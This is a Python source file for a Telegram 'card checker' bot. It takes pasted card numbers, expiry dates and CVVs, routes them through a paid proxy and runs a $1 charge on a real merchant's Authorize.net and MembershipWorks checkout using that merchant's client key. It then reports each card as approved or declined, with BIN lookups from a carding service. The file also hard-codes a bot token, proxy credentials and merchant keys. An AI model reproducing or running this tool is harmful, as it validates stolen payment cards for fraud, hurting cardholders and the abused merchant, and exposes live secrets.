import requests
import json
from datetime import datetime
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import logging
import asyncio

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = "7518278408:AAGAimjNk4-iRAx2CQykgDsGKyI7A40rYcw"
GROUP_CHAT_ID = -1002478418647
OWNER_ID = 6775748231
COOLDOWN_SECONDS = 30
PROXY_STRING = "rp.scrapegw.com:6060:k9xpmz64oxn8o6h-country-us:vgyg55mrlahbujv"
PRIMARY_BIN_API_URL = "https://bins.antipublic.cc/bins/{}"
FALLBACK_BIN_API_URL = "https://lookup.binlist.net/{}"

# In-memory storage for cooldowns
user_cooldowns = {}

def mask_sensitive(data):
    """Mask sensitive information in logs."""
    if isinstance(data, str) and '|' in data:
        parts = data.split('|')
        if len(parts) == 4:
            card_number = parts[0][:6] + '****' + parts[0][-4:]
            return f"{card_number}|{parts[1]}|{parts[2]}|{parts[3]}"
    return data

def country_code_to_flag(country_code):
    """Convert a two-letter country code to a flag emoji."""
    if not country_code or country_code == 'UNKNOWN':
        return ''
    try:
        code = country_code.upper()
        if len(code) != 2 or not code.isalpha():
            return ''
        flag = ''.join(chr(0x1F1E6 + ord(c) - ord('A')) for c in code)
        return flag
    except Exception as e:
        logger.warning(f"Failed to convert country code {country_code} to flag: {e}")
        return ''

def validate_card_input(card_input):
    """Validate and parse card details from input."""
    try:
        card_number, month, year, cvv = card_input.strip().split('|')
        
        if not (card_number.isdigit() and 15 <= len(card_number) <= 16):
            return None, "Invalid card number. Must be 15-16 digits."
        
        month = month.zfill(2)
        if not (month.isdigit() and 1 <= int(month) <= 12):
            return None, "Invalid month. Must be 1-12."
        
        if len(year) == 2:
            current_year = datetime.now().year
            century = current_year // 100 * 100
            year = str(century + int(year))
        if not (year.isdigit() and len(year) == 4 and int(year) >= datetime.now().year):
            return None, "Invalid year. Must be current year or later."
        
        if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
            return None, "Invalid CVV. Must be 3-4 digits."
        
        expiration_date = f"{month}{year[-2:]}"
        return (card_number, expiration_date, cvv), None
    except ValueError:
        return None, "Invalid input format. Use card_number|month|year|cvv (e.g., 4492894167839250|09|2029|837)."

def check_proxy(proxy_string):
    """Check if the proxy is live."""
    try:
        parts = proxy_string.split(':')
        if len(parts) != 4:
            raise ValueError("Invalid proxy string format")
        proxy_host, proxy_port, proxy_username, proxy_password = parts
        proxy_url = f"http://{proxy_username}:{proxy_password}@{proxy_host}:{proxy_port}"
        proxies = {'http': proxy_url, 'https': proxy_url}
        response = requests.get('https://api.ipify.org', proxies=proxies, timeout=10)
        return response.status_code == 200, "PROXY LIVE ✅"
    except Exception as e:
        return False, f"PROXY DEAD ❌: {str(e)}"

def get_bin_info(card_number):
    """Fetch BIN information from primary API, with fallback to secondary API."""
    bin_number = card_number[:6]
    
    try:
        response = requests.get(PRIMARY_BIN_API_URL.format(bin_number))
        response.raise_for_status()
        data = response.json()
        logger.info(f"Primary BIN API raw response for {bin_number}: {data}")
        bin_info = {
            'bin': bin_number,
            'card_type': str(data.get('type', 'UNKNOWN')).upper(),
            'card_brand': str(data.get('brand', 'UNKNOWN')).upper(),
            'country': str(data.get('country_name', 'UNKNOWN')).upper(),
            'country_code': str(data.get('country', 'UNKNOWN')).upper(),
            'bank': str(data.get('bank', 'UNKNOWN')).upper()
        }
        logger.info(f"Primary BIN API processed bin_info for {bin_number}: {bin_info}")
        if any(v == 'UNKNOWN' for k, v in bin_info.items() if k in ['card_type', 'card_brand', 'bank']):
            raise ValueError("Incomplete data from primary API")
        return bin_info
    except Exception as e:
        logger.warning(f"Primary BIN API failed for {bin_number}: {str(e)}")
    
    try:
        headers = {'Accept-Version': '3'}
        response = requests.get(FALLBACK_BIN_API_URL.format(bin_number), headers=headers)
        response.raise_for_status()
        data = response.json()
        logger.info(f"Fallback BIN API raw response for {bin_number}: {data}")
        bin_info = {
            'bin': bin_number,
            'card_type': str(data.get('type', 'UNKNOWN')).upper(),
            'card_brand': str(data.get('scheme', 'UNKNOWN')).upper(),
            'country': str(data.get('country', {}).get('name', 'UNKNOWN')).upper(),
            'country_code': str(data.get('country', {}).get('alpha2', 'UNKNOWN')).upper(),
            'bank': str(data.get('bank', {}).get('name', 'UNKNOWN')).upper()
        }
        logger.info(f"Fallback BIN API processed bin_info for {bin_number}: {bin_info}")
        return bin_info
    except Exception as e:
        logger.warning(f"Fallback BIN API failed for {bin_number}: {str(e)}")
        return {
            'bin': bin_number,
            'card_type': 'UNKNOWN',
            'card_brand': 'UNKNOWN',
            'country': 'UNKNOWN',
            'country_code': 'UNKNOWN',
            'bank': 'UNKNOWN'
        }

def process_payment(card_number, expiration_date, card_code, proxies):
    """Process payment using Authorize.net with retry mechanism."""
    session = requests.Session()
    headers1 = {
        'Accept': '*/*',
        'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json; charset=UTF-8',
        'Origin': 'https://www.bomaphila.com',
        'Referer': 'https://www.bomaphila.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {
        'securePaymentContainerRequest': {
            'merchantAuthentication': {
                'name': '3q85aDr4SN9t',
                'clientKey': '224BvW2FU79Fuzx86cxGMFpsdU3Bc7cqA9cvx64u6XXD5y6qTFmhFEHGF8Dhu6tC',
            },
            'data': {
                'type': 'TOKEN',
                'id': '48db3e3f-0125-7438-0280-7103995c8d7d',
                'token': {
                    'cardNumber': card_number,
                    'expirationDate': expiration_date,
                    'cardCode': card_code,
                    'zip': '10001',
                    'fullName': 'rgtrh',
                },
            },
        },
    }
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = session.post('https://api2.authorize.net/xml/v1/request.api', headers=headers1, json=json_data, proxies=proxies, timeout=10)
            response.raise_for_status()
            json_data = json.loads(response.content)
            tkn = json_data['opaqueData']['dataValue']
            break
        except Exception as e:
            if attempt < max_retries - 1:
                logger.warning(f"Retry {attempt + 1}/{max_retries} for first API request: {str(e)}")
                time.sleep(2)
                continue
            return False, f"Error in first API request: {str(e)}"

    headers2 = {
        'accept': 'application/json',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
        'origin': 'https://www.bomaphila.com',
        'priority': 'u=1, i',
        'referer': 'https://www.bomaphila.com/',
        'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        'x-org': '29723',
    }
    files = {
        'nam': (None, 'rgtrvfgtfh'),
        'xni': (None, 'fdhghjhvg'),
        'eml': (None, 'kxmxgs@telegmail.com'),
        'phn': (None, '720-555-0175'),
        'xin': (None, '34'),
        'xvn': (None, 'bvfgbgb'),
        'crd[nam]': (None, 'rgtrh'),
        'crd[ad1]': (None, 'gtrh'),
        'crd[zip]': (None, '10001'),
        'crd[sta]': (None, 'NY'),
        'crd[con]': (None, 'US'),
        'crd[cit]': (None, 'New York'),
        'crd[loc][0]': (None, '-73.9991637'),
        'crd[loc][1]': (None, '40.75368539999999'),
        'crd[tok]': (None, tkn),
        'sum': (None, '1'),
        'itm[0][_id]': (None, '63b85320ab1e2e42be3eab83'),
        'itm[0][amt]': (None, '1'),
        'itm[0][qty]': (None, '1'),
    }
    for attempt in range(max_retries):
        try:
            response = session.post(
                'https://api.membershipworks.com/v2/form/63b850789a7a3e06a1078012/checkout',
                headers=headers2,
                files=files,
                proxies=proxies,
                timeout=10
            )
            response.raise_for_status()
            result = response.json().get('error', 'CARD ADDED SUCCESSFULLY')
            status = "APPROVED ✅" if not response.json().get('error') else "DECLINED ❌"
            return status == "APPROVED ✅", result
        except Exception as e:
            if attempt < max_retries - 1:
                logger.warning(f"Retry {attempt + 1}/{max_retries} for second API request: {str(e)}")
                time.sleep(2)
                continue
            return False, f"Error in second API request: {str(e)}"

def escape_markdown_v2(text):
    """Escape all reserved MarkdownV2 characters and handle non-string inputs."""
    if text is None:
        return ""
    text = str(text)
    reserved_chars = r'_*[]()~`>#+-=|{}.!'
    for char in reserved_chars:
        text = text.replace(char, f'\\{char}')
    return text

def format_response(card_input, status, result, bin_info, proxy_status):
    """Format the bot response with monospaced fields and proper MarkdownV2 escaping."""
    logger.info(f"Raw format_response inputs: card_input={mask_sensitive(card_input)}, status={status}, result={result}, bin_info={bin_info}, proxy_status={proxy_status}")
    
    country_flag = country_code_to_flag(bin_info['country_code'])
    
    escaped_card_input = escape_markdown_v2(card_input)
    escaped_result = escape_markdown_v2(result)
    escaped_bin = escape_markdown_v2(bin_info['bin'])
    escaped_card_brand = escape_markdown_v2(bin_info['card_brand'])
    escaped_card_type = escape_markdown_v2(bin_info['card_type'])
    escaped_country = escape_markdown_v2(bin_info['country'])
    escaped_bank = escape_markdown_v2(bin_info['bank'])
    escaped_proxy_status = escape_markdown_v2(proxy_status)
    
    logger.info(f"Escaped fields: card_input={mask_sensitive(escaped_card_input)}, result={escaped_result}, bin={escaped_bin}, card_brand={escaped_card_brand}, card_type={escaped_card_type}, country={escaped_country}, bank={escaped_bank}, proxy_status={escaped_proxy_status}")
    
    return (
        f"◆ 𝑪𝑨𝑹𝑫 ➜ `{escaped_card_input}`\n"
        f"◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ `{status}`\n"
        f"◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ `{escaped_result}`\n"
        f"◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ AUTHNET 1$\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"◆ 𝑩𝑰𝑵 ➜ `{escaped_bin}` \\- `{escaped_card_brand}` \\- `{escaped_card_type}`\n"
        f"◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ `{escaped_country}` \\- `{country_flag}`\n"
        f"◆ 𝑩𝑨𝑵𝑲 ➜ `{escaped_bank}`\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"◆ Developed by: @CODExHYPER\n"
        f"◆ 𝑷𝑹𝑶𝑿𝒀𝑺: {escaped_proxy_status}"
    )

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a welcome message when the /start command is issued."""
    user = update.effective_user
    welcome_message = (
        f"Welcome {user.first_name}!\n\n"
        "This bot processes credit card details in the specified group.\n\n"
        "Available Commands:\n"
        "/start - Show this welcome message\n"
        "/at or .at card_number|mm|yyyy|cvv - Process card details\n"
        ".at (reply to a message with card details) - Process card from replied message\n\n"
        "Notes:\n"
        "- Use in the designated group only (except for the owner).\n"
        "- 30-second cooldown between commands (except for the owner).\n"
        "- Card format: card_number|mm|yyyy|cvv (e.g., 5258551424343838|11|2028|471).\n\n"
        "Developed by @CODExHYPER"
    )
    await update.message.reply_text(welcome_message)

async def handle_at_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the .at or /at command."""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    message = update.message
    current_time = time.time()

    logger.info(f"Chat ID: {chat_id}")

    if chat_id != GROUP_CHAT_ID and user_id != OWNER_ID:
        await update.message.reply_text("This bot can only be used in the specified group or by the owner in private chat.")
        return

    if user_id != OWNER_ID:
        if user_id in user_cooldowns and current_time - user_cooldowns[user_id] < COOLDOWN_SECONDS:
            remaining = int(COOLDOWN_SECONDS - (current_time - user_cooldowns[user_id]))
            await update.message.reply_text(f"Please wait {remaining} seconds before using the command again.")
            return
        user_cooldowns[user_id] = current_time

    card_input = None
    if message.reply_to_message and message.reply_to_message.text:
        lines = message.reply_to_message.text.split('\n')
        for line in lines:
            if '|' in line:
                card_input = line.strip()
                break
    elif message.text.startswith(('.at ', '/at ')):
        parts = message.text.split(' ', 1)
        if len(parts) > 1:
            card_input = parts[1].strip()

    if not card_input:
        await update.message.reply_text("Please provide card details in the format: card_number|mm|yyyy|cvv")
        return

    logger.info(f"Processing card_input: {mask_sensitive(card_input)}")

    card_details, error = validate_card_input(card_input)
    if not card_details:
        await update.message.reply_text(error)
        return

    checking_message = await update.message.reply_html(
        "<b>Checking your card...</b>",
        reply_to_message_id=message.message_id
    )

    card_number, expiration_date, card_code = card_details

    proxy_valid, proxy_status = check_proxy(PROXY_STRING)
    if not proxy_valid:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=checking_message.message_id,
            text=f"Proxy error: {proxy_status}"
        )
        return

    proxy_host, proxy_port, proxy_username, proxy_password = PROXY_STRING.split(':')
    proxy_url = f"http://{proxy_username}:{proxy_password}@{proxy_host}:{proxy_port}"
    proxies = {'http': proxy_url, 'https': proxy_url}

    bin_info = get_bin_info(card_number)

    success, result = process_payment(card_number, expiration_date, card_code, proxies)
    status = "APPROVED ✅" if success else "DECLINED ❌"

    response = format_response(card_input, status, result, bin_info, proxy_status)

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=checking_message.message_id,
            text=response,
            parse_mode="MarkdownV2"
        )
    except Exception as e:
        logger.warning(f"Failed to edit message: {e}. Response text: {response}")
        try:
            await update.message.reply_text(
                response,
                parse_mode="MarkdownV2",
                reply_to_message_id=message.message_id
            )
        except Exception as e2:
            logger.error(f"Failed to send fallback message: {e2}. Response text: {response}")
            plain_response = response.replace('\\', '')
            await update.message.reply_text(
                plain_response,
                reply_to_message_id=message.message_id
            )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors and notify owner."""
    logger.warning('Update "%s" caused error "%s"', update, context.error)
    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=f"Bot error: {context.error}\nUpdate: {update}"
    )

def main():
    """Start the bot using a new event loop if none exists."""
    print("Bot is started")
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("at", handle_at_command))
    application.add_handler(MessageHandler(filters.Regex(r'^\.at($|\s)'), handle_at_command))
    application.add_error_handler(error_handler)

    try:
        loop.run_until_complete(application.initialize())
        loop.run_until_complete(application.start())
        loop.run_until_complete(application.updater.start_polling(allowed_updates=Update.ALL_TYPES))
        loop.run_forever()
    except KeyboardInterrupt:
        loop.run_until_complete(application.updater.stop())
        loop.run_until_complete(application.stop())
        loop.run_until_complete(application.shutdown())
    except Exception as e:
        logger.error(f"Error running bot: {e}")
    finally:
        pass

if __name__ == '__main__':
    main()
